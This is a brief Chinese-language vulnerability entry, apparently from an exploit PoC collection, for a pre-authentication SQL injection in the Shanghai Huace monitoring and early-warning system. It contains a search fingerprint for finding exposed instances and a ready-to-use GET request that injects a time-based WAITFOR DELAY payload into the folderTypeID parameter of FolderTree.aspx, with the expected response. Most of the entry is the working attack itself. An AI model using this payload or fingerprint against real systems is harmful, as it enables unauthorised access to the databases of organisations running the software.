# 上海华测监测预警系统存在前台FolderTree存在SQL注入漏洞

上海华测监测预警系统 ｜ SQL注入 ｜ —
- **指纹**：`app.name="华测监测预警系统"`
- **请求**：`GET /ND/Folder/FolderTree.aspx?folderTypeID=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200